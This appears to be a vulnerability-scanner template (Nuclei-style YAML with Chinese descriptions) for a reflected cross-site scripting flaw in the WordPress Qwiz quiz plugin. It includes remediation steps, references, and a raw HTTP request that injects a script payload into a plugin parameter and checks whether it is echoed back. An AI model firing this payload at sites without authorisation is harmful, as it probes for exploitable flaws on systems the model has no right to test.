id: wp-qwiz-online-xss

info:
  name: Qwiz Online Quizzes And Flashcards <= 3.36 - 跨站脚本漏洞
  author: r3Y3r53
  severity: medium
  description: Qwiz Online Quizzes And Flashcards <= 3.36 - 跨站脚本 存在跨站脚本漏洞。该模板通过构造恶意输入并检查响应回显或执行特征，验证目标是否会在浏览器上下文中执行注入脚本。
  remediation: |
    - 按厂商公告升级到已修复版本；原始说明中提到的版本信息为：Fixed in version 3。
    - 对所有可控输入实施严格校验，并在输出到 HTML、JavaScript 或 URL 上下文前完成正确编码。
    - 如为后台或插件组件问题，建议同步更新到厂商已修复版本并审计相关功能入口。
  reference:
    - https://wpscan.com/vulnerability/d3c10f69-87b6-43fd-bcbc-c2d35b683ff4
    - https://packetstormsecurity.com/files/154403/
    - https://wordpress.org/plugins/qwiz-online-quizzes-and-flashcards/
  metadata:
    verified: true
    max-request: 1
    publicwww-query: "/wp-content/plugins/qwiz-online-quizzes-and-flashcards/"
  tags: wordpress,wp-plugin,wp,wpscan,packetstorm,qwiz-online-quizzes-and-flashcards,xss,vuln

http:
  - raw:
      - |
        GET /wp-content/plugins/qwiz-online-quizzes-and-flashcards/registration_complete.php?&qname=%3C/script%3E%3Cscript%3Ealert(document.domain)%3C/script%3E HTTP/1.1
        Host: {{Hostname}}

    matchers:
      - type: dsl
        dsl:
          - 'status_code == 200'
          - 'contains_all(body, "quizzes/flashcard", "</script><script>alert(document.domain)</script>")'
        condition: and
